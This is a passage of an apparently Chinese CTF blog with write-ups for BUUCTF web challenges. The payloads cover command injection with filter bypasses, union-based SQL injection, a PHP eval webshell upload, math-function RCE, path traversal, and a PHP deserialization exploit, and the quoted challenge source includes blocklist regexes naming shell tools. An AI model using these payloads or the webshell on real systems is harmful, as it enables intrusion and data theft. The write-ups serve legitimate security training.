&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">命令执行是可以不过有正则:</span><br><span class="line">preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span><br><span class="line">可以看到还有md5碰撞:</span><br><span class="line">if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;]))</span><br></pre></td></tr></table></figure>

<p>思路基本就明确了,MD5碰撞然后命令执行.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>dir之后在根目录下看到flag文件,但是过滤了大部分的读取命令,卡住了……<br>看了狮虎们的wp,||是匹配一个,而类似l\s这样的命令也确实可以执行,所谓payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd=/bin/c\at%20/flag</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF–PingPingPing"><a href="#GXYCTF–PingPingPing" class="headerlink" title="GXYCTF–PingPingPing"></a>GXYCTF–PingPingPing</h2><p>打开有提示,可以命令执行看一下目录下有什么:</p>
<p><a href="http://99e3139e-25d4-4f85-90d3-5cd806683caf.node3.buuoj.cn/?ip=127.0.0.1|ls" target="_blank" rel="noopener">http://99e3139e-25d4-4f85-90d3-5cd806683caf.node3.buuoj.cn/?ip=127.0.0.1|ls</a></p>
<p>可以看到有flag.php,index.php.</p>
<p>尝试读flag发现果然被ban了，那么试试index.php发现提示空格被ban了。</p>
<p>绕过空格的方法大概有以下几种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure>

<p>不妨就用 $IFS试试，无果，用${IFS}发现{}被ban。再试$IFS$1成功。<br>可以看到index.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\&apos;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&apos;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以使用变量拼接,正好变量里面有个a可以覆盖:/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php<br>或者echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p>
<p>dalao做法:内联，就是将反引号内命令的输出作为输入执行。</p>
<p><a href="http://530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn/?ip=127.0.0.1;cat$IFS$9`ls`" target="_blank" rel="noopener">http://530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn/?ip=127.0.0.1;cat$IFS$9`ls`</a></p>
<p>内联，就是将反引号内命令的输出作为输入执行。</p>
<h2 id="GXYCTF2019–BabySqli"><a href="#GXYCTF2019–BabySqli" class="headerlink" title="GXYCTF2019–BabySqli"></a>GXYCTF2019–BabySqli</h2><p>输入错误密码看源码可以看到select * from user where username = ‘$name’</p>
<p>那么就可以在username这个注入点下手处理了。这道题目只过滤了基本的and与等号还是很能操作的。不过后来看别人说这题考点在MD5查询绕过。这么说的原因是，就算成功注入把admin密码的MD5拿到，因为解不了的缘故等于没用。基于题目提示的wrong pass，那么大概率是直接拿输入密码的MD5数值跟数据库里已知值比较。</p>
<p>稍微FUZZ一下admin’ union select 1,2,3可以确认有三个字段,后面确认大概是id,admin，passwd三个字段。这里为了绕过，需要保证我们的查询结构一致，就可直接select 想要的返回值。就是我们的sql语句执行时,passsword字段中的内容要==md5(我们密码栏输入的password)</p>
<p>然后我们便随便找个 密码 就123吧：</p>
<p>明文:123</p>
<p>md5:202cb962ac59075b964b07152d234b70</p>
<p>于是我们便构造这样的payload：</p>
<p>username:1’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#</p>
<p>password:123</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>url传参,联合注入.fuzz之后发现通过正则将union,select,from这些关键函数都被替换为空，我们可以通过双写的形式进行绕过.payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uniunionon%20selselectect%201%2C2%2Cgroup_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23</span><br></pre></td></tr></table></figure>

<p>可以看到数据库有:information_schema,test,performance_schema,mysql,geek,ctf.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查表,payload:</span><br><span class="line">%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br></pre></td></tr></table></figure>

<p>表有b4bsql,geekuser.<br>查列名:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D&apos;b4bsql&apos;%23</span><br></pre></td></tr></table></figure>

<p>列名有’id,username,password’<br>爆字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>一进来啥都没有,访问.git发现403了,上githack,可以下载到index.php,源码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&apos;exp&apos;]))&#123;</span><br><span class="line">    if (!preg_match(&apos;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&apos;, $_GET[&apos;exp&apos;])) &#123;</span><br><span class="line">        if(&apos;;&apos; === preg_replace(&apos;/[a-z,_]+\((?R)?\)/&apos;, NULL, $_GET[&apos;exp&apos;])) &#123;</span><br><span class="line">            if (!preg_match(&apos;/et|na|info|dec|bin|hex|oct|pi|log/i&apos;, $_GET[&apos;exp&apos;])) &#123;</span><br><span class="line">                // echo $_GET[&apos;exp&apos;];</span><br><span class="line">                @eval($_GET[&apos;exp&apos;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>第一层过滤了所有的php伪协议,然后是特殊字符和linux下的一些常用命令.<br>卡住了,我好菜啊…看了师傅们的rce</p>
<p>我们重点首先访问当前目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(&apos;.&apos;));</span><br></pre></td></tr></table></figure>

<p>但是这个.我们被匹配掉了<br>所以只能构造函数了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p>发现得到其中的文件，php有两个函数<br>array_flip,php官方文档是这么解释的</p>
<p>array_flip() 函数用于反转/交换数组中的键名和对应关联的键值。</p>
<p>重点是下一个函数</p>
<p>array_rand()函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</p>
<p>所以我们就可以构造如下payloads</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>这题比较简单,f12查看源代码,有一个跳转,然后抓包看一下能看到有个php文件,访问可以看到源码,正则过滤了大部分参数,直接php伪协议读flag.</p>
<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>源码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&apos;c&apos;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&apos;c&apos;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line">    preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs);</span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&apos;echo &apos;.$content.&apos;;&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无参rce,可以用bash_convert()</p>
<h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一:"></a>思路一:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac /flag.php</span><br></pre></td></tr></table></figure>

<p>分析:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot;</span><br><span class="line">dechex(1598506324) =&gt; &quot;5f474554&quot;</span><br><span class="line">$pi=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串</span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) =&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  //&#123;&#125;可以代替[]</span><br><span class="line">另一种payload是这样</span><br><span class="line">$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br><span class="line">分析：</span><br><span class="line">base_convert(696468,10,36) =&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br><span class="line">//操作xx和yy，中间用逗号隔开，echo都能输出</span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>

<p>既然不能$_GET，那就header传</p>
<h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二:"></a>思路二:</h3><p>直接想办法catflag也是可以的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//exec(&apos;hex2bin(dechex(109270211257898))&apos;) =&gt; exec(&apos;cat f*&apos;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line">//system(&apos;cat&apos;.dechex(16)^asinh^pi) =&gt; system(&apos;cat *&apos;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>先传个一句话看看,发现过滤了&lt;?,那就用js.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;</span><br><span class="line"> eval($_POST[&apos;pass&apos;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>提示我们要图片格式,那就加个图片头:GIF89a.可以上传.但是这是jpg,需要上传php文件让其解析.<br>测试发现phtml没有被过滤.上传成功,在upload目录下.蚁剑连一下.</p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>随便输入个密码，数据包中找到hint:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &apos;admin&apos; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>

<p>暗示我让where后面的东西返回true<br>想到sql注入的一个情况，要让其变成password=’xxx’ or ‘1’的形式。</p>
<p>写个脚本找满足这样条件的md5明文：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i = 0;;) &#123;</span><br><span class="line">  for($c = 0;$c&lt;1000000; $c++,$i++)</span><br><span class="line">   if= (stripos(md5($i,true),&apos;\&apos;or\&apos;&apos;)!==false)</span><br><span class="line">     echo &quot;\nmd5($i) = &quot; .md5($i, true) . &quot;\n&quot;; </span><br><span class="line">    echo &quot;.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到个ffifdyop,输入后，查看跳转后页面的源码.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&apos;a&apos;];</span><br><span class="line">$b = $_GET[&apos;b&apos;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>这个==可以用数组或者一下两个值来绕过:<strong>QNKCDZO,240610708.</strong><br>绕过后有个必须用数组绕过的php,绕过后拿到flag.</p>
<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">cve-2018-12613-PhpMyadmin后台文件包含</a></p>
<p>影响版本：4.8.0——4.8.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>

<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>check.php代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&apos;seed&apos;]))&#123;</span><br><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line">mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&apos;&apos;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id=&apos;p1&apos;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;num&apos;]))&#123;</span><br><span class="line">    if($_POST[&apos;num&apos;]===$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure>

<p>如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的<br><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a></p>
<p>这道题的应用场景中，字符串生成方式是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&apos;&apos;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id=&apos;p1&apos;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>根据生成算法逆向出满足php_mt_seed工具要求的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str1 = &apos;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line">str2 = &apos;znXCVCNqS5&apos;</span><br><span class="line">str3 = str1[::-1]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = &apos;&apos;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + &apos; &apos; + str(j) + &apos; &apos; + &apos;0&apos; + &apos; &apos; + str(len(str1) - 1) + &apos; &apos;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>爆破出seed值后再代回原程序就可以得到完整的字符串</p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019] PHP"></a>[极客大挑战 2019] PHP</h2><p>提示说每次都备份,访问<a href="http://www.zip可以看" target="_blank" rel="noopener">www.zip,可以看</a>源码.</p>
<p>index.php:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &apos;class.php&apos;;</span><br><span class="line">    $select = $_GET[&apos;select&apos;];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>class.php:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &apos;nonono&apos;;</span><br><span class="line">    private $password = &apos;yesyes&apos;;</span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">            die(); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">payload:</span><br><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>1:利用CVE-2016-7124,序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过_wakeup的执行<br>2:加%00:username,password都是私有变量,变量中的类名前后会有空白符，而复制的时候会丢失</p>
<h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><p>拿到题目完全没有思路,看的pcat师傅的wp.还是大佬厉害……</p>
<p>这里发现服务器是用OpenResty服务器，这里pcat科普下：OpenResty是一个基于Nginx与Lua的高性能Web平台，其内部集成了大量精良的Lua库、第三方模块以及大多数的依赖项。</p>
<p>f12可以看到有/uploads/文件,访问后里面左边preview的格式是/preview?f= </p>
<p>尝试文件包含漏洞</p>
<p>由于是使用OpenResty，尝试包含nginx的配置文件，默认是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/nginx/conf.d/default.conf</span><br></pre></td></tr></table></figure>

<p>发现../被过滤，尝试下双写可以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/preview?f=....//....//....//....//....//....//etc..//nginx..//conf.d..//default.conf</span><br></pre></td></tr></table></figure>

<p>有preview.lua的路径,尝试读取preview.lua源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/preview?f=....//preview.lua</span><br></pre></td></tr></table></figure>

<p>有个Hint:flag in flag_Is_h3re<br>尝试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019] LoveSQL"></a>[极客大挑战 2019] LoveSQL</h2><p>判断列数为3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username=1&apos; order by 4 %23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>查看回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username=1&apos; union select 1,2,3 %23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>查数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username=1&apos; union select 1,version(),group_concat(schema_name) from information_schema.schemata %23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>查表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username=1&apos; union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>查字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username=1&apos; union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=&apos;l0ve1ysq1&apos;%23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>查字段内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username=1&apos; union select 1,version(),group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</span><br></pre></td></tr></table></figure>

